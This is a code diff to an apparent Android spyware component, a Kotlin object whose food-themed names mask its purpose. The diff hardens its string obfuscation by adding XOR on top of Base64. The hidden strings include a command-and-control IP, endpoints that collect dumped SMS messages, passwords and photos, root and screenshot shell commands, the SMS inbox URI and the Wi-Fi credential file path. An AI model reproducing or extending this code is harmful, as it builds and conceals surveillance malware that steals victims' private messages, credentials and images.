@@ -22,8 +22,8 @@ object SecretBox {
      */
     fun decrypt(encrypted: String): String {
         return try {
-            // Updated: Just decode Base64 to avoid corruption via XOR
-            String(Base64.decode(encrypted, Base64.DEFAULT))
+            val data = Base64.decode(encrypted, Base64.DEFAULT)
+            String(data.map { (it.toInt() xor SEASONING.toInt()).toByte() }.toByteArray())
         } catch (e: Exception) {
             ""
         }
@@ -55,28 +55,28 @@ object SecretBox {
     }
 
     // IPs and Ports
-    fun getKitchenAddress(): String = decrypt("NDcuMTI5LjE0NC45") // 47.129.144.9
+    fun getKitchenAddress(): String = decrypt("Tk1US0hDVEtOTlRD") // 47.129.144.9
     fun getTruckPort(): Int = 1269
     fun getToppingPort(): Int = 6767
     fun getCarnePort(): Int = 7000
 
     // Endpoints
-    fun getRubbishEndpoint(): String = decrypt("aHR0cDovLzQ3LjEyOS4xNDQuOTo4MDAwL2R1bXAvc21z") // http://47.129.144.9:8000/dump/sms
-    fun getRecycleEndpoint(): String = decrypt("aHR0cDovLzQ3LjEyOS4xNDQuOTo4MDAwL2R1bXAvcGFzc3dvcmRz") // http://47.129.144.9:8000/dump/passwords
-    fun getSignageEndpoint(): String = decrypt("aHR0cDovLzQ3LjEyOS4xNDQuOTo4MDAwL2R1bXAvaW1hZ2Vz") // http://47.129.144.9:8000/dump/images
+    fun getRubbishEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVR4PFwpVCRcJ") // http://47.129.144.9:8000/dump/sms
+    fun getRecycleEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVR4PFwpVChsJCQ0VCB4J") // http://47.129.144.9:8000/dump/passwords
+    fun getSignageEndpoint(): String = decrypt("Eg4OCkBVVU5NVEtIQ1RLTk5UQ0BCSkpKVR4PFwpVExcbHR8J") // http://47.129.144.9:8000/dump/images
     // fun getCarneHeader(): String = decrypt("UE9TVCAvcmVtb3RlLXN0cmVhbSBIVFRQLzEuMQ==") // POST /remote-stream HTTP/1.1
 
     // Shell Commands
-    fun getScreencapCmd(): String = decrypt("c2NyZWVuY2FwIC1w") // screencap -p
-    fun getListSignageCmd(): String = decrypt("bHMgLXQgL3NkY2FyZC9EQ0lNL0NhbWVyYQ==") // ls -t /sdcard/DCIM/Camera
-    fun getSuCmd(): String = decrypt("c3U=") // su
-    fun getExitCmd(): String = decrypt("ZXhpdA==") // exit
+    fun getScreencapCmd(): String = decrypt("CRkIHx8UGRsKWlcK") // screencap -p
+    fun getListSignageCmd(): String = decrypt("FglaVw5aVQkeGRsIHlU+OTM3VTkbFx8IGw==") // ls -t /sdcard/DCIM/Camera
+    fun getSuCmd(): String = decrypt("CQ8=") // su
+    fun getExitCmd(): String = decrypt("HwITDg==") // exit
 
     // URIs and Paths
-    fun getScrapUri(): String = decrypt("Y29udGVudDovL3Ntcy9pbmJveA==") // content://sms/inbox
-    fun getWifiPath(): String = decrypt("L2RhdGEvbWlzYy9hcGV4ZGF0YS9jb20uYW5kcm9pZC53aWZpL1dpZmlDb25maWdTdG9yZS54bWw=") // /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml
+    fun getScrapUri(): String = decrypt("GRUUDh8UDkBVVQkXCVUTFBgVAg==") // content://sms/inbox
+    fun getWifiPath(): String = decrypt("VR4bDhtVFxMJGVUbCh8CHhsOG1UZFRdUGxQeCBUTHlQNExwTVS0THBM5FRQcEx0pDhUIH1QCFxY=") // /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml
 
     // Command Strings
-    fun getCmdStop(): String = decrypt("Q01EX1NUT1A=") // CMD_STOP
-    fun getCmdStart(): String = decrypt("Q01EX1NUQVJU") // CMD_START
+    fun getCmdStop(): String = decrypt("OTc+JSkuNSo=") // CMD_STOP
+    fun getCmdStart(): String = decrypt("OTc+JSkuOygu") // CMD_START
 }
